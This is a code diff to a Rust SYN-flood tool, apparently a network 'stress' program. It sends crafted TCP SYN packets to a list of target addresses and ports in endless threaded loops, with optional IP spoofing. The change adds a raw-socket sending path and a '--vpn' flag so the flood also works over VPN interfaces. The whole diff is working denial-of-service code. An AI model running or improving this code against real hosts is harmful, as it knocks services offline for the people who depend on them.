@@ -17,9 +17,11 @@ use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::ipv4::{self, Ipv4Flags, MutableIpv4Packet};
 use pnet::packet::tcp::{self, MutableTcpPacket, TcpFlags, TcpOption};
 
+use socket2::{Domain, SockAddr, Socket, Type};
+
 use std::error::Error;
 use std::io::{stdout, Write};
-use std::net::{IpAddr, Ipv4Addr};
+use std::net::{IpAddr, Ipv4Addr, SocketAddr};
 use std::str::FromStr;
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
@@ -228,21 +230,38 @@ fn stress(
         buffers.push(buffer);
     }
 
-    let mut cursor = 0;
     loop {
-        // replace port field in the packet, recompute checksum
-        if config.enable_spoofing {
-            spoof_syn_packet(&destinations[cursor], &mut buffers[cursor]);
-        } else {
-            recycle_syn_packet(
-                &config.iface_ip,
-                &destinations[cursor],
-                &mut buffers[cursor],
-            );
+        for cursor in 0..num_dest {
+            // replace port field in the packet, recompute checksum
+            if config.enable_spoofing {
+                spoof_syn_packet(&destinations[cursor], &mut buffers[cursor]);
+            } else {
+                recycle_syn_packet(
+                    &config.iface_ip,
+                    &destinations[cursor],
+                    &mut buffers[cursor],
+                );
+            }
+            tx.send_to(&buffers[cursor], None);
+            packets_sent.fetch_add(1, Ordering::SeqCst);
         }
-        tx.send_to(&buffers[cursor], None);
-        packets_sent.fetch_add(1, Ordering::SeqCst);
-        cursor = (cursor + 1) % num_dest;
+    }
+}
+
+fn stress_ip(config: Config, destinations: Vec<Target>, packets_sent: Arc<AtomicU64>) {
+    let socket = Socket::new(Domain::IPV4, Type::RAW, None).unwrap();
+    let num_dest = destinations.len();
+
+    loop {
+        for ind in 0..num_dest {
+            let mut buf = [0u8; TCP_SYN_PACKET_LEN];
+            build_syn_packet(&config, &destinations[ind], &mut buf);
+            // XXX: horribly ineffecient
+            let addr: SockAddr = destinations[ind].clone().into();
+            // XXX: horribly ineffecient
+            socket.send_to(&buf[ETHERNET_HEADER_LEN..], &addr).unwrap();
+            packets_sent.fetch_add(1, Ordering::SeqCst);
+        }
     }
 }
 
@@ -257,6 +276,19 @@ impl FromStr for Target {
             addr: s[..pos].parse()?,
             port: s[pos + 1..].parse()?,
         })
+    }
+}
+
+impl From<Target> for SocketAddr {
+    fn from(dest: Target) -> SocketAddr {
+        SocketAddr::new(IpAddr::V4(dest.addr), dest.port)
+    }
+}
+
+impl From<Target> for SockAddr {
+    fn from(dest: Target) -> SockAddr {
+        let addr: SocketAddr = dest.into();
+        addr.into()
     }
 }
 
@@ -294,6 +326,10 @@ struct Args {
     /// Note that more often than not these packets would be dropped by the network
     #[clap(long)]
     enable_spoofing: bool,
+
+    /// Sends IP packets instead of Ethernet (for VPNs)
+    #[clap(short = 'X', long)]
+    vpn: bool,
 }
 
 fn resolve_iface(args: &Args) -> (NetworkInterface, Config) {
@@ -401,6 +437,7 @@ fn main() {
     stdout().flush().unwrap();
 
     let (interface, config) = resolve_iface(&args);
+    let is_vpn = args.vpn;
 
     println!(" DONE");
     println!(
@@ -419,7 +456,11 @@ fn main() {
         let config = config.clone();
         let targets = args.target.clone();
         handles.push(thread::spawn(move || {
-            stress(&interface, config, targets, packets_sent)
+            if is_vpn {
+                stress_ip(config, targets, packets_sent);
+            } else {
+                stress(&interface, config, targets, packets_sent);
+            }
         }));
     }
 
